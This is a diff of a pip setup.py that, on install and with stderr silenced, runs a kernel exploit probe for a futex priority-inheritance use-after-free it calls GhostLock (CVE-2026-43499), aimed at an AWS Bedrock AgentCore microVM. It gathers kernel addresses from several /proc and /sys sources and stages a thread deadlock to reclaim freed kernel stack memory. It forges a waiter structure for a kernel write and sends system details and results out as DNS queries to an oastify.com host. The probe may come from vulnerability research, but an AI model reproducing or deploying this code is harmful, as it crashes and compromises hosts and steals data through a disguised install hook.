@@ -1,34 +1,36 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ghostlock_setup.py -- drop-in pip setup.py probing GhostLock (CVE-2026-43499),
-tuned for an AWS Bedrock AgentCore Runtime microVM (arm64 / 6.1.161-*.amzn2023).
-
-Stages the 3-thread / 3-futex PI dependency cycle, forces FUTEX_CMP_REQUEUE_PI
-to roll back with -EDEADLK (the only path reaching remove_waiter() with
-current != waiter->task), reclaims the waiter's just-freed FUTEX_WAIT_REQUEUE_PI
-stack frame with controlled bytes, drives rt_mutex_adjust_pi() via
-sched_setscheduler(waiter_tid), and reports over DNS. setup() always runs.
+ghostlock_setup.py -- pip setup.py probing GhostLock (CVE-2026-43499),
+tuned for an AWS Bedrock AgentCore Runtime microVM (arm64, amzn2023).
 
   phase A   poison via PR_SET_MM_MAP's on-stack user_auxv[]. Non-canonical
-            qwords, so no kernel address and no PAN dependence.
+            qwords: no kernel address needed, PAN-proof.
             WEDGE = dangling pi_blocked_on dereferenced = vulnerable.
             CLEAN = pi_blocked_on was NULL = patched.
   phase A2  same poison via pselect6's on-stack fd_set scratch (different frame
             depth; also the fallback when CONFIG_CHECKPOINT_RESTORE is off).
   phase B   forge a fake rt_mutex_waiter whose rb node collapses rb_erase to a
-            single 8-byte store. Needs a writable kernel VA, derived at runtime.
+            single 8-byte store. Only meaningful on a *vulnerable* kernel,
+            because on a fixed one pi_blocked_on is already NULL.
 
-Hard invariants kept:
-  * the waiter makes NO syscall between the reclaim and the drive, so the dead
-    frame is not re-clobbered. The reclaim result is relayed by the mover.
-  * every mm_map address is a mapping *start*, so validate_prctl_map_addr's
-    find_vma()+vm_start check can never reject (a rejected map means no auxv
-    copy, which would look exactly like a patched kernel).
-  * PR_SET_MM_MAP needs no capability; PR_SET_MM_AUXV would (no CAP_SYS_RESOURCE).
-  * no KASLR assumption; the linear-map tier is KASLR independent.
-  * fork per attempt, every wait bounded, child always SIGKILLed, so
-    panic=1 / kernel.panic=1 cannot be reached via an oops (panic_on_oops=0).
+CHECKPOINTED REPORTING.  This box has panic_on_oops=1 and panic=5, so a fault
+reboots the microVM and kills setup.py. Each destructive step is therefore
+preceded by its own short DNS burst, so the last burst received tells you
+exactly how far the run got and the missing next burst is the signal:
+
+    glk4        idx 800   stage=START      (gate only)
+    glk4/A      idx 820   stage=AFTER_A    (arrives => phase A did not fault)
+    glk4/A2     idx 840   stage=AFTER_A2
+    glk4/DONE   idx 000   final verdict
+
+  START only                       -> the reclaim faulted on the first drive
+                                      => VULNERABLE (when vstat says so)
+  AFTER_A but not AFTER_A2         -> A clean, A2 faulted => VULNERABLE
+  START..DONE all present          -> no fault at all => patched
+
+TIMEOUTS ARE HIERARCHICAL: every internal wait is shorter than the child's
+lifetime, so a staging failure always reports instead of going silent.
 """
 
 import ctypes
@@ -44,17 +46,21 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 
 # --------------------------------------------------------------------------
-# endpoint / transport
+# transport
 # --------------------------------------------------------------------------
 _ENDPOINT = "6gnltn2z9z06ygz7lbev8a9yrpxjlc91.oastify.com"
-_LABEL_CHUNK = 52          # hex chars -> 3+1+3+1+52 = 60 octets, under 63
+_LABEL_CHUNK = 52          # 3+1+3+1+52 = 60 octets, under the 63 limit
 _PASSES = 4
 _GAP = 0.5
 _WORKERS = 12
 
-_BUDGET = 26.0
-_CHILD_TIMEOUT = 0.30
-_MAX_ATTEMPTS = 64
+_BUDGET = 30.0
+_CHILD_TIMEOUT = 0.80      # child lifetime
+_WAIT_STAGE = 0.50         # mover: staging handshake
+_WAIT_RECLAIM = 0.55       # mover: waiter reclaim
+_MAX_ATTEMPTS = 36
+
+_CKPT = (800, 820, 840)    # checkpoint index bases; final report uses 0
 
 # --------------------------------------------------------------------------
 # ABI
@@ -72,8 +78,7 @@ PR_SET_MM_MAP = 14
 MM_MAP_SIZE = 104
 AUXV_BYTES = 46 * 8
 _MM_KEYS = ("start_code", "end_code", "start_data", "end_data", "start_brk",
-            "brk", "start_stack", "arg_start", "arg_end", "env_start",
-            "env_end")
+            "brk", "start_stack", "arg_start", "arg_end", "env_start", "env_end")
 
 SCHED_OTHER = 0
 SCHED_BATCH = 3
@@ -82,29 +87,24 @@ SYSLOG_ACTION_READ_ALL = 3
 SYSLOG_ACTION_SIZE_BUFFER = 10
 
 POISON = 0xdeadbee11c518f58          # non-canonical
-KIMAGE_VADDR = 0xffff800008000000    # arm64 VA_BITS=48, KASLR-off only
-PAGE_OFFSET = 0xffff000000000000     # arm64 linear map base, fixed
+KIMAGE_VADDR = 0xffff800008000000    # arm64 VA_BITS=48
+PAGE_OFFSET = 0xffff000000000000     # arm64 linear map base
 
 _MACH = os.uname()[4].lower()
-#                 futex prctl sched_setsched pselect6 syslog
-_SYS = {
-    "aarch64": (98, 167, 119, 72, 116),
-    "arm64": (98, 167, 119, 72, 116),
-    "riscv64": (98, 167, 119, 72, 116),
-    "x86_64": (202, 157, 144, 270, 103),
-    "amd64": (202, 157, 144, 270, 103),
-    "i386": (240, 172, 146, 309, 103),
-    "armv7l": (240, 172, 119, 72, 103),
-}
+#                 futex prctl sched pselect6 syslog
+_SYS = {"aarch64": (98, 167, 119, 72, 116), "arm64": (98, 167, 119, 72, 116),
+        "riscv64": (98, 167, 119, 72, 116), "x86_64": (202, 157, 144, 270, 103),
+        "amd64": (202, 157, 144, 270, 103), "i386": (240, 172, 146, 309, 103),
+        "armv7l": (240, 172, 119, 72, 103)}
 (SYS_FUTEX, SYS_PRCTL, SYS_SCHED, SYS_PSELECT6, SYS_SYSLOG) = _SYS.get(
     _MACH, (98, 167, 119, 72, 116))
 
 _libc = ctypes.CDLL(None, use_errno=True)
-_libc.syscall.restype = ctypes.c_long          # 64-bit returns, not c_int
+_libc.syscall.restype = ctypes.c_long
 _L, _V, _U, _I = ctypes.c_long, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_int
 
 # --------------------------------------------------------------------------
-# stderr silence (stream + fd) so pip output stays clean
+# stderr silence
 # --------------------------------------------------------------------------
 class _BS(object):
     def write(self, b): return len(b)
@@ -147,7 +147,7 @@ def _loud(st):
         pass
 
 # --------------------------------------------------------------------------
-# syscalls: every wrapper returns -errno on failure, never glibc's -1
+# syscalls (all return -errno, never glibc's -1)
 # --------------------------------------------------------------------------
 def _rc(r):
     return -ctypes.get_errno() if r < 0 else r
@@ -158,7 +158,6 @@ def _futex(uaddr, op, val=0, timeout=0, uaddr2=0, val3=0):
                              _V(timeout), _V(uaddr2), _U(val3)))
 
 def _prctl_map(addr, size):
-    # prctl(PR_SET_MM, PR_SET_MM_MAP, map, sizeof(map), 0)
     ctypes.set_errno(0)
     return _rc(_libc.syscall(_L(SYS_PRCTL), _I(PR_SET_MM), _I(PR_SET_MM_MAP),
                              _V(addr), _L(size), _L(0), _L(0)))
@@ -191,6 +190,12 @@ def _s32(buf, off, val):
 def _s64(buf, off, val):
     struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)
 
+def _yield(n):
+    """Cheap GIL release: clock_nanosleep(0) returns immediately, unlike
+    time.sleep(0.0001) which pays full wakeup latency."""
+    if (n & 31) == 31:
+        time.sleep(0)
+
 def _read_text(path, lim=1 << 22):
     try:
         with open(path, "rb") as fh:
@@ -215,7 +220,9 @@ def _release():
     m = re.search(r"Linux version\s+(\S+)", _read_text("/proc/version", 512))
     return m.group(1) if m else os.uname()[2]
 
-_FIXED = {"6.1": 175, "6.6": 140, "6.12": 86, "6.18": 27, "7.0": 4}
+# (first fix, follow-up CVE-2026-53166 fix)
+_FIXED = {"6.1": (175, 177), "6.6": (140, 144), "6.12": (86, 88),
+          "6.18": (27, 36), "7.0": (4, 6)}
 
 def _vstatus(rel):
     m = re.search(r"(?:^|[^\d])(\d+)\.(\d+)\.(\d+)", rel or "")
@@ -227,8 +234,14 @@ def _vstatus(rel):
     if v >= (7, 1, 0):
         return "FIXED"
     k = "%d.%d" % (v[0], v[1])
-    return ("VULNERABLE" if v[2] < _FIXED[k] else "FIXED") if k in _FIXED \
-        else "VULNERABLE_BY_BRANCH"
+    if k not in _FIXED:
+        return "VULNERABLE_BY_BRANCH"
+    first, second = _FIXED[k]
+    if v[2] < first:
+        return "VULNERABLE"
+    if v[2] < second:
+        return "FIXED_NO_FOLLOWUP"
+    return "FIXED"
 
 def _klog():
     try:
@@ -237,46 +250,90 @@ def _klog():
             n = 1 << 18
         buf = ctypes.create_string_buffer(n)
         r = _syslog(SYSLOG_ACTION_READ_ALL, ctypes.addressof(buf), n)
-        if r <= 0:
-            return ""
-        return buf.raw[:r].decode("utf-8", "replace")
+        return buf.raw[:r].decode("utf-8", "replace") if r > 0 else ""
     except Exception:
         return ""
 
 def _panic_knobs():
     return dict((k, _read_text("/proc/sys/kernel/" + k, 32).strip() or "?")
-                for k in ("panic", "panic_on_oops", "oops_limit", "panic_on_warn"))
+                for k in ("panic", "panic_on_oops", "oops_limit"))
+
+_WANT = ("inet6_protos", "__bss_start", "__bss_stop", "_end", "core_pattern",
+         "_stext", "_etext")
 
 def _kallsyms():
-    out = {}
+    """Returns (symbols, lines, zeroed). lines/zeroed are diagnostic: on this
+    class of box the file is present but every address prints as 0."""
+    out, lines, zeroed = {}, 0, True
     for line in _read_text("/proc/kallsyms", 8 << 20).splitlines():
         p = line.split()
-        if len(p) >= 3 and p[2] in ("inet6_protos", "__bss_start", "__bss_stop",
-                                    "_end", "core_pattern", "_stext"):
-            try:
-                a = int(p[0], 16)
-            except ValueError:
-                continue
-            if a and p[2] not in out:
-                out[p[2]] = a
+        if len(p) < 3:
+            continue
+        lines += 1
+        if p[2] not in _WANT:
+            continue
+        try:
+            a = int(p[0], 16)
+        except ValueError:
+            continue
+        if a:
+            zeroed = False
+            out.setdefault(p[2], a)
+    return out, lines, zeroed
+
+def _vmcoreinfo():
+    """SYMBOL(name)=0x... lines; real addresses even when kallsyms is masked."""
+    out = {}
+    txt = _read_text("/sys/kernel/vmcoreinfo", 1 << 16)
+    for m in re.finditer(r"SYMBOL\((\w+)\)=(0x[0-9a-fA-F]+)", txt):
+        try:
+            out[m.group(1)] = int(m.group(2), 16)
+        except ValueError:
+            pass
     return out
 
-# printk lines carry a "[  0.000000] " prefix, so the anchor is (?:^|\])
+def _module_addrs():
+    out = []
+    base = "/sys/module"
+    try:
+        for mod in sorted(os.listdir(base))[:64]:
+            for sec in (".text", ".data", ".bss"):
+                p = os.path.join(base, mod, "sections", sec)
+                try:
+                    with open(p) as fh:
+                        v = int(fh.read().strip(), 16)
+                except Exception:
+                    continue
+                if v and v not in out:
+                    out.append(v)
+    except Exception:
+        pass
+    return out
+
+def _iomem():
+    kern, code = [], None
+    for line in _read_text("/proc/iomem", 1 << 18).splitlines():
+        m = re.match(r"^([0-9a-fA-F]+)-([0-9a-fA-F]+)\s*:\s*(.*)$", line.strip())
+        if not m:
+            continue
+        lo, hi, name = int(m.group(1), 16), int(m.group(2), 16), m.group(3).strip()
+        if name.startswith("Kernel code") and code is None:
+            code = lo
+        if name.startswith("Kernel"):
+            kern.append((name, lo, hi))
+    return kern, code
+
 _LAY = re.compile(r"(?:^|\])\s*(\.text|\.rodata|\.data|\.bss|linear|memory|"
                   r"modules|vmalloc)\s*:\s*(0x[0-9a-fA-F]+)\s*-\s*"
                   r"(0x[0-9a-fA-F]+)", re.M)
 
 def _boot_layout(log):
-    """arm64 dump_mem() prints the VA layout; dmesg_restrict=0 makes it readable.
-    These are exact runtime addresses, so they survive KASLR."""
     out = {}
     for m in _LAY.finditer(log or ""):
         out.setdefault(m.group(1), (int(m.group(2), 16), int(m.group(3), 16)))
     return out
 
 def _kcore_base():
-    """First kernel PT_LOAD vaddr from /proc/kcore's ELF header. /proc/kcore is
-    0400 root, so this often EACCESes for uid 10001."""
     h = _read_bin("/proc/kcore", 8192)
     if len(h) < 64 or h[:4] != b"\x7fELF":
         return None
@@ -297,40 +354,42 @@ def _kcore_base():
             return v
     return None
 
-def _candidates(ks, lay, kcore):
-    """Ordered kernel addresses for the forged waiter. Must be writable: a plain
-    store into .text would take a permission fault under STRICT_KERNEL_RWX."""
+def _candidates(ks, vmi, mods, lay, kcore, iomem_kern, iomem_code):
+    """Writable-only: a plain store into .text takes a permission fault under
+    STRICT_KERNEL_RWX, and on this box a fault panics the VM."""
     out = []
-    for s in ("__bss_start", "_end", "inet6_protos", "core_pattern"):
-        if ks.get(s):
-            out.append(ks[s] & ~0xF)
-    for name in (".bss", ".data"):
+    for src in (vmi, ks):                                   # exact if present
+        for s in ("_stext", "__bss_start", "_end", "inet6_protos", "core_pattern"):
+            if src.get(s):
+                out.append(src[s] & ~0xF)
+    for s in ("_stext",):
+        if (vmi.get(s) or ks.get(s)):
+            st = vmi.get(s) or ks[s]
+            out.append((st + 0x2000000) & ~0xF)             # likely .data/.bss
+    for name in (".bss", ".data"):                          # exact runtime VAs
         if name in lay:
             lo, hi = lay[name]
             out.append((lo + max((hi - lo) // 2, 0)) & ~0xF)
-    if ".text" in lay:
-        out.append((lay[".text"][1] + 0x400000) & ~0xF)
+    if iomem_code is not None:                              # phys -> VA, VA fixed
+        for name, lo, hi in iomem_kern:
+            if name.startswith("Kernel bss") or name.startswith("Kernel data"):
+                out.append((KIMAGE_VADDR + (lo - iomem_code)) & ~0xF)
     if kcore:
-        out.append((kcore + 0x400000) & ~0xF)
+        out.append((kcore + 0x2000000) & ~0xF)
+    out.extend(m & ~0xF for m in mods[:1])
     lin = lay.get("linear") or lay.get("memory")
     out.append(((lin[0] + 0x80000000) if lin else (PAGE_OFFSET + 0x80000000)) & ~0xF)
-    out.append(KIMAGE_VADDR + 0x4000000)
+    out.append((KIMAGE_VADDR + 0x2000000) & ~0xF)
     ded = []
     for c in out:
         if c and c not in ded:
             ded.append(c)
-    return ded[:3]
+    return ded[:4]
 
 def _mm_fields():
-    """Build a mm_map that validate_prctl_map_addr can never reject.
-
-    That function does, per field: find_vma(mm, addr); if (!vma ||
-    vma->vm_start > addr) return -EINVAL; plus a VM_IO|VM_PFNMAP check. So every
-    address must be a *mapping start*, and the ordered pairs must be
-    non-decreasing. Deriving from /proc/self/maps (rather than /proc/self/stat,
-    where a page-masked brk lands exactly on the heap VMA's vm_end) removes the
-    whole class of false rejections -- and a rejected map means no auxv copy,
-    which is indistinguishable from a patched kernel."""
+    """Every address is a mapping *start*, so validate_prctl_map_addr's
+    find_vma()+vm_start check cannot reject -- a rejected map means no auxv copy,
+    which would be indistinguishable from a patched kernel."""
     maps = []
     for line in _read_text("/proc/self/maps", 1 << 20).splitlines():
         parts = line.split(None, 5)
@@ -343,23 +402,16 @@ def _mm_fields():
         except ValueError:
             continue
     if not maps:
-        # all-equal is always ordered, and start_stack is inside the stack VMA
-        try:
-            rest = _read_text("/proc/self/stat", 4096)
-            st = int(rest[rest.rfind(")") + 2:].split()[25]) & ~0xFFF
-        except Exception:
-            st = 0x1000
-        return dict((k, st) for k in _MM_KEYS)
+        return dict((k, 0x1000) for k in _MM_KEYS)
 
-    def pick(want, fallback):
+    def pick(want, fb):
         for lo, hi, perms, _n in maps:
             if want in perms and hi - lo >= 0x1000:
                 return lo, hi
-        return fallback
+        return fb
 
     first = (maps[0][0], maps[0][1])
-    code = pick("x", first)
-    data = pick("w", first)
+    code, data = pick("x", first), pick("w", first)
     stack = first
     for lo, hi, _p, name in maps:
         if name == "[stack]" and hi - lo >= 0x1000:
@@ -367,29 +419,23 @@ def _mm_fields():
             break
     return {"start_code": code[0], "end_code": code[1],
             "start_data": data[0], "end_data": data[1],
-            "start_brk": data[0], "brk": data[0],
-            "start_stack": stack[0],
+            "start_brk": data[0], "brk": data[0], "start_stack": stack[0],
             "arg_start": first[0], "arg_end": first[1],
             "env_start": first[0], "env_end": first[1]}
 
 def _pack_map(buf, auxv_addr, auxv_size, fields):
     for i, k in enumerate(_MM_KEYS):
         _s64(buf, i * 8, fields[k])
-    _s64(buf, 88, auxv_addr)      # __u64 *auxv
-    _s32(buf, 96, auxv_size)      # __u32 auxv_size
-    _s32(buf, 100, 0xFFFFFFFF)    # __u32 exe_fd
+    _s64(buf, 88, auxv_addr)
+    _s32(buf, 96, auxv_size)
+    _s32(buf, 100, 0xFFFFFFFF)
 
 # --------------------------------------------------------------------------
-# forged rt_mutex_waiter -- both 6.1 layouts pinned at once
+# forged rt_mutex_waiter (both 6.1+ layouts pinned)
 # --------------------------------------------------------------------------
 def _forge_block(T):
-    """__rb_erase_augmented: rb_right == 0 -> case 1 via rb_left; parent == NULL
-    -> __rb_change_child collapses to a single store root->rb_node = V at
-    lock+8; pc bit0 == 1 (BLACK) -> rebalance == NULL, __rb_erase_color never
-    runs. rb_left and rb_right must not both be non-zero (successor path)."""
     V = T + 8
-    return ((0x00, 1), (0x08, 0), (0x10, V),
-            (0x18, 1), (0x20, 0), (0x28, 0),
+    return ((0x00, 1), (0x08, 0), (0x10, V), (0x18, 1), (0x20, 0), (0x28, 0),
             (0x30, T), (0x38, T), (0x40, 0), (0x48, 0), (0x50, T), (0x58, T),
             (0x60, 0), (0x68, 0))
 
@@ -397,8 +443,8 @@ def _forge_block(T):
 # child
 # --------------------------------------------------------------------------
 _O_WAIT, _O_TGT, _O_CHAIN = 0x00, 0x08, 0x10
-_F_TID, _F_ARM, _F_STAGE, _F_RECLAIM, _F_DRIVE, _F_DONE, _F_RC = (
-    0x100, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x118)
+_F_TID, _F_CHAIN, _F_TGT, _F_ARM, _F_STAGE, _F_RECLAIM, _F_DRIVE, _F_DONE, _F_RC = (
+    0x100, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x118, 0x11C, 0x120)
 
 def _child(wfd, mode, off, T, secs):
     W = mmap.mmap(-1, 0x1000)
@@ -415,36 +461,38 @@ def _child(wfd, mode, off, T, secs):
         for o, v in _forge_block(T):
             if off + o + 8 <= AUXV_BYTES:
                 _s64(A, off + o, v)
-
     _pack_map(Mp, aa, AUXV_BYTES, _mm_fields())
 
     sel_n = 320
-    sel_size = (sel_n // 64) * 8          # FDS_BYTES(320) == 40, fits stack_fds
+    sel_size = (sel_n // 64) * 8          # FDS_BYTES(320) == 40
 
     def waiter():
         try:
             _s32(W, _F_TID, threading.get_native_id())
             if _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
                 return
-            _s32(W, _F_STAGE, 2)
-            _s32(W, _O_WAIT, FUTEX_WAITERS)          # glibc-style arming
+            _s32(W, _F_CHAIN, 1)                 # handshake: chain is OURS
+            n = 0
+            while not _g32(W, _F_TGT):           # wait for owner to hold target
+                n += 1
+                _yield(n)
+            _s32(W, _O_WAIT, FUTEX_WAITERS)      # glibc-style arming
             _s32(W, _F_ARM, 1)
             ts = ctypes.create_string_buffer(16)
-            struct.pack_into("<qq", ts, 0, 0, 200000000)
+            struct.pack_into("<qq", ts, 0, 0, 600000000)
             _futex(wa + _O_WAIT, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                    FUTEX_WAITERS, ctypes.addressof(ts), wa + _O_TGT, 0)
-            _s32(W, _F_STAGE, 5)
             # ---- reclaim: the very next syscall ----
             if mode.endswith("select"):
                 sts = ctypes.create_string_buffer(16)
-                struct.pack_into("<qq", sts, 0, 0, 30000000)
+                struct.pack_into("<qq", sts, 0, 0, 400000000)
                 rc = _pselect6(sel_n, aa, aa + 2 * sel_size,
                                aa + 4 * sel_size, ctypes.addressof(sts))
             else:
                 rc = _prctl_map(ma, MM_MAP_SIZE)
             _s32(W, _F_RC, rc)
             _s32(W, _F_RECLAIM, 1)
-            # ---- then NOTHING but memory writes: no syscall may re-clobber ----
+            # ---- from here: memory writes ONLY, no syscall may re-clobber ----
             while _g32(W, _F_DONE) == 0:
                 pass
         except BaseException:
@@ -452,74 +500,76 @@ def _child(wfd, mode, off, T, secs):
 
     def owner():
         try:
+            n = 0
+            while not _g32(W, _F_CHAIN):         # do not race for the chain
+                n += 1
+                _yield(n)
             if _futex(wa + _O_TGT, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG) != 0:
                 return
-            _s32(W, _F_STAGE, 3)
-            _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
-            _s32(W, _F_STAGE, 4)
+            _s32(W, _F_TGT, 1)
+            _futex(wa + _O_CHAIN, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)   # blocks
         except BaseException:
             pass
 
     th_w = threading.Thread(target=waiter, daemon=True)
     th_o = threading.Thread(target=owner, daemon=True)
-    th_o.start()
     th_w.start()
+    th_o.start()
 
-    # ---- mover (this thread) ----
+    # ---- mover ----
     t0 = time.monotonic()
+    n = 0
     while not (_g32(W, _F_ARM) and (_g32(W, _O_CHAIN) & FUTEX_WAITERS)):
-        if time.monotonic() - t0 > 1.2:
+        n += 1
+        _yield(n)
+        if time.monotonic() - t0 > _WAIT_STAGE:
             os.write(wfd, b"3")
             return
-        time.sleep(0.0003)
-    time.sleep(0.0004)
 
-    # nr_wake must be 1; nr_requeue (val2) is 1 in the documented/LTP pattern,
-    # so cascade only on -EINVAL (which has no side effect).
+    # nr_wake must be 1; cascade val2 only on -EINVAL (no side effect)
     r = -1
     for val2 in (1, 0, 0x7FFFFFFF):
-        for _ in range(150):
+        for k in range(3000):
             r = _futex(wa + _O_WAIT, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                        1, val2, wa + _O_TGT, _g32(W, _O_WAIT))
             if r in (-EDEADLK, -22):
                 break
             if r not in (0, -11, -4):
                 break
-            time.sleep(0.0001)
+            _yield(k)
         if r in (-EDEADLK, -22):
             break
     _futex(wa + _O_WAIT, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1)
     if r != -EDEADLK:
         os.write(wfd, b"3")
         return
-
     os.write(wfd, b"S")
+
     t0 = time.monotonic()
+    n = 0
     while _g32(W, _F_RECLAIM) == 0:
-        if time.monotonic() - t0 > 0.4:
+        n += 1
+        _yield(n)
+        if time.monotonic() - t0 > _WAIT_RECLAIM:
             os.write(wfd, b"2")
             return
-        time.sleep(0.0001)
-
-    # relay the reclaim result (mover's write, not the waiter's)
-    rc = _g32(W, _F_RC)
-    if rc >= 0x80000000:
-        rc -= 0x100000000
-    os.write(wfd, b"R" + bytes([rc & 0xFF]))
 
     tid = _g32(W, _F_TID)
     if not tid:
         os.write(wfd, b"2")
         return
-    _s32(W, _F_DRIVE, 1)
+    _s32(W, _F_DRIVE, 1)                       # drive first, relay after
     for i in range(3):
         _sched(tid, SCHED_BATCH if (i & 1) == 0 else SCHED_OTHER)
-        time.sleep(0.0001)
     _s32(W, _F_DONE, 1)
+
+    rc = _g32(W, _F_RC)
+    if rc >= 0x80000000:
+        rc -= 0x100000000
+    os.write(wfd, b"R" + bytes([rc & 0xFF]))
     os.write(wfd, b"1")
 
 def _attempt(mode, off, T, timeout):
-    """Returns (outcome, reclaim_rc)."""
     r, w = os.pipe()
     pid = os.fork()
     if pid == 0:
@@ -565,7 +615,7 @@ def _attempt(mode, off, T, timeout):
         os.kill(pid, signal.SIGKILL)
     except Exception:
         pass
-    for _ in range(300):
+    for _ in range(400):
         try:
             p, _st = os.waitpid(pid, os.WNOHANG)
         except ChildProcessError:
@@ -577,7 +627,6 @@ def _attempt(mode, off, T, timeout):
         os.close(r)
     except Exception:
         pass
-
     rc = None
     i = buf.find(b"R")
     if i >= 0 and i + 1 < len(buf):
@@ -604,15 +653,16 @@ def _lookup(name):
     except Exception:
         return False
 
-def _exfil(text):
+def _exfil(text, base=0, terminator=True, passes=None):
     h = text.encode("utf-8", "replace").hex()
-    labels, idx = [], 0
+    labels, idx = [], base
     for i in range(0, max(len(h), 1), _LABEL_CHUNK):
         labels.append("%03d-%03d-%s" % (idx, i // _LABEL_CHUNK, h[i:i + _LABEL_CHUNK]))
         idx += 1
-    labels.append("end-%03d" % idx)
+    if terminator:
+        labels.append("end-%03d" % idx)
     pending = labels
-    for _ in range(_PASSES):
+    for _ in range(passes or _PASSES):
         if not pending:
             break
         try:
@@ -633,10 +683,14 @@ def _probe():
     log = _klog()
     rel = _release()
     vstat = _vstatus(rel)
-    ks, lay, kcore = _kallsyms(), _boot_layout(log), _kcore_base()
-    cands = _candidates(ks, lay, kcore)
+    ks, ks_lines, ks_zero = _kallsyms()
+    vmi = _vmcoreinfo()
+    mods = _module_addrs()
+    lay, kcore = _boot_layout(log), _kcore_base()
+    iomem_kern, iomem_code = _iomem()
+    cands = _candidates(ks, vmi, mods, lay, kcore, iomem_kern, iomem_code)
 
-    lines = ["glk/3", "kern=" + rel, "arch=" + _MACH, "vstat=" + vstat]
+    lines = ["glk4", "kern=" + rel, "arch=" + _MACH, "vstat=" + vstat]
     try:
         lines.append("ncpu=%d" % len(os.sched_getaffinity(0)))
     except Exception:
@@ -647,27 +701,35 @@ def _probe():
     kn = _panic_knobs()
     lines.append("panic=%s onoops=%s oopslim=%s" % (
         kn["panic"], kn["panic_on_oops"], kn["oops_limit"]))
-    lines.append("kall=%d kcore=%d layout=%d cand=%s" % (
-        len(ks), 1 if kcore else 0, len(lay),
-        ",".join("0x%x" % c for c in cands) or "none"))
+    lines.append("src ks=%d/%d zero=%d vmi=%d mod=%d lay=%d kcore=%d iomem=%d" % (
+        len(ks), ks_lines, int(ks_zero), len(vmi), len(mods), len(lay),
+        1 if kcore else 0, len(iomem_kern)))
+    lines.append("cand=" + (",".join("0x%x" % c for c in cands) or "none"))
 
-    # reclaim availability, probed in-process. Buffer must stay referenced, and
-    # auxv_size=0 keeps this process's saved_auxv untouched.
+    # reclaim availability. auxv_size=368 here too, so the auxv path itself is
+    # exercised in-process before any child depends on it.
     pb = mmap.mmap(-1, 0x1000)
-    _pack_map(pb, 0, 0, _mm_fields())
+    zero_auxv = mmap.mmap(-1, AUXV_BYTES)
+    _pack_map(pb, _addr(zero_auxv), AUXV_BYTES, _mm_fields())
     prc = _prctl_map(_addr(pb), MM_MAP_SIZE)
-    lines.append("prctl_map_rc=%d" % prc)
+    lines.append("prctl_auxv_rc=%d" % prc)
+    gate = list(lines)
+    _exfil("stage=START\n" + "\n".join(gate) + "\n", base=_CKPT[0], terminator=False)
 
     A = A2 = "SKIP"
     rcA = rcA2 = None
     if os.environ.get("GLK_SKIP_A") != "1":
         A, rcA = _attempt("poison_prctl", 0, 0, _CHILD_TIMEOUT)
         lines.append("A=%s rc=%s" % (A, rcA))
+        _exfil("stage=AFTER_A\n" + "\n".join(lines[-8:]) + "\n",
+               base=_CKPT[1], terminator=False)
         if A != "WEDGE" and time.monotonic() - t0 < _BUDGET:
             A2, rcA2 = _attempt("poison_select", 0, 0, _CHILD_TIMEOUT)
             lines.append("A2=%s rc=%s" % (A2, rcA2))
+            _exfil("stage=AFTER_A2\n" + "\n".join(lines[-8:]) + "\n",
+                   base=_CKPT[2], terminator=False)
 
-    Bhits, Btried = 0, 0
+    Bhits = Btried = 0
     modes = []
     if A == "WEDGE":
         modes.append("forge_prctl")
@@ -693,7 +755,7 @@ def _probe():
                 for off in offs:
                     if time.monotonic() - t0 > _BUDGET or Btried >= _MAX_ATTEMPTS:
                         break
-                    res, _rc = _attempt(mode, off, T, _CHILD_TIMEOUT)
+                    res, _r = _attempt(mode, off, T, _CHILD_TIMEOUT)
                     Btried += 1
                     if res == "CLEAN":
                         hit = off
@@ -713,6 +775,8 @@ def _probe():
         v = "NO_TRIGGER"
     elif vstat == "VULNERABLE":
         v = "VERSION_VULNERABLE_NO_FAULT"
+    elif vstat == "FIXED_NO_FOLLOWUP":
+        v = "FIXED_NO_FOLLOWUP"
     elif vstat == "FIXED":
         v = "LIKELY_PATCHED"
     else:
@@ -729,11 +793,12 @@ def _probe():
 
     lines.insert(1, "verdict=" + v)
     lines.append("ms=%d" % int((time.monotonic() - t0) * 1000))
-    lines.append("note=WEDGE=fault_on_dangling_pi_blocked_on;CLEAN=patched")
+    lines.append("note=START_only_or_missing_next_checkpoint_means_a_fault_"
+                 "panicked_the_vm")
     return "\n".join(lines) + "\n"
 
 # --------------------------------------------------------------------------
-# driver -- always leaves pip working
+# driver
 # --------------------------------------------------------------------------
 def _marker():
     try:
@@ -747,14 +812,14 @@ def _run():
     try:
         text = _probe()
     except BaseException:
-        text = "glk/3\nverdict=HARNESS_ERROR\n"
+        text = "glk4\nverdict=HARNESS_ERROR\n"
     try:
-        ok, _tot = _exfil(text)
+        ok, _t = _exfil(text, base=0)
     except BaseException:
         pass
     finally:
         _loud(st)
-    if ok:                      # only suppress a re-probe if something landed
+    if ok:
         m = _marker()
         if m:
             try:
